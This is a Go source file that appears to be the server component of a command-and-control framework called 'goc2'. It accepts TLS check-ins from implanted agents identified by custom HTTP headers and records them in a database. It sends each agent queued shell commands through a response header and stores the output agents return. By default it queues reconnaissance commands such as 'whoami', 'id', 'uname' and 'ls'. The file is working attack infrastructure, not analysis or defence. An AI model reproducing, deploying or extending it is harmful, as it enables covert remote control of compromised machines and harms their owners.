package server

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
	"github.com/molu/goc2/pkg/db"
)

type Server struct {
	DomainName  string
	ListenAddr  string
	CACertFile  string
	CertFile    string
	PrivKeyFile string
	KeyPassFile string
	IDHeader    string
	CmdHeader   string
	DataHeader  string
}

const logFilePath = "./logs/goc2server.log"

func (s *Server) Listen() {
	// logFile, _ := logger.SetFileLogger(logFilePath)
	// defer logFile.Close()

	mux := s.getServeMux()

	srv := &http.Server{
		Addr:      s.ListenAddr,
		Handler:   mux,
		TLSConfig: s.getTLSConfig(),
	}

	log.Printf("starting the server on %s", s.ListenAddr)

	if err := srv.ListenAndServeTLS("", ""); err != nil {
		log.Fatalf("error listening on port: %v", err)
	}
}

func (s *Server) getServeMux() (mux *http.ServeMux) {
	mux = http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		dbSession := db.GetDB()
		defer dbSession.Close()
		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)

		agentID := req.Header.Get(s.IDHeader)
		agentData := req.Header.Get(s.DataHeader)

		if agentID != "" {
			logStr += fmt.Sprintf(" | ClientID: %s", agentID)
			if !db.AgentExists(dbSession, agentID) {
				newAgent := &db.DBAgent{Id: agentID, CreatedAt: "now", UpdatedAt: "none"}
				db.CreateAgent(
					dbSession,
					newAgent,
				)
				fmt.Printf("Created new agent.")
			}

			cmd, err := db.GetCommand(dbSession, agentID)
			if err == nil {
				w.Header().Set(s.CmdHeader, cmd.Command)
				log.Printf("%s header set with value %s", s.CmdHeader, cmd)
			} else {
				fmt.Printf("adding a few cmds for agent %s", agentID)
				for _, c := range []string{"whoami", "id", "uname", "ls"} {
					db.CreateCommand(
						dbSession,
						&db.DBCommand{Id: uuid.NewString(), AgentID: agentID, Command: c, Result: "", CreatedAt: fmt.Sprint(time.Now().Unix()), UpdatedAt: ""},
					)
				}
			}
		}

		if agentData != "" {
			db.UpdateCommand(
				dbSession,
				&db.DBCommand{AgentID: agentID, Command: agentData, Result: agentData, UpdatedAt: "now123"},
			)
			logStr += fmt.Sprintf(" | Data: %s", agentData)
		}
		log.Print(logStr)
		fmt.Fprint(w, "")
	})
	return
}
